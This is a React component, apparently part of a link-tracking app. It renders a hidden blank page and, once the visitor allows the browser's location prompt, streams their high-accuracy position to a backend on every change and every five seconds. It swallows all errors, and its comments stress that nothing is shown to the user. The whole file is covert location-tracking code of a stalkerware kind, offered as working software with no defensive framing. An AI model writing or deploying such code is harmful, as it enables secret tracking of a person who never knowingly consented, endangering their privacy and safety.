import React, { useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api';

function TrackLink() {
  const { linkId } = useParams();
  const watchIdRef = useRef(null);
  const intervalRef = useRef(null);

  const generateDeviceId = () => {
    return 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
  };

  const sendLocationUpdate = async (latitude, longitude) => {
    if (!linkId) return;
    
    try {
      const deviceId = localStorage.getItem('deviceId') || generateDeviceId();
      localStorage.setItem('deviceId', deviceId);
      
      await axios.post(`${API_URL}/location/update`, {
        linkId: linkId,
        latitude: latitude,
        longitude: longitude,
        deviceId: deviceId
      });
    } catch (err) {
      // Silent error handling - don't show anything to user
    }
  };

  const startSilentTracking = () => {
    if (!navigator.geolocation || !linkId) {
      return;
    }

    // Silently request location permission and start tracking
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Send initial location
        sendLocationUpdate(position.coords.latitude, position.coords.longitude);
        
        // Watch position changes silently
        watchIdRef.current = navigator.geolocation.watchPosition(
          (pos) => {
            sendLocationUpdate(pos.coords.latitude, pos.coords.longitude);
          },
          () => {}, // Silent error handling
          {
            enableHighAccuracy: true,
            maximumAge: 0
          }
        );

        // Also send updates every 5 seconds as backup
        intervalRef.current = setInterval(() => {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              sendLocationUpdate(pos.coords.latitude, pos.coords.longitude);
            },
            () => {} // Silent error handling
          );
        }, 5000);
      },
      () => {}, // Silent error handling - don't show anything to user
      {
        enableHighAccuracy: true,
        maximumAge: 0
      }
    );
  };

  useEffect(() => {
    // Silently start tracking without any UI
    if (linkId) {
      startSilentTracking();
    }
    
    return () => {
      // Cleanup on unmount
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, [linkId]);

  // Return completely blank/invisible page
  return (
    <div style={{ display: 'none' }}>
      {/* Completely invisible - no UI shown to user */}
    </div>
  );
}

export default TrackLink;

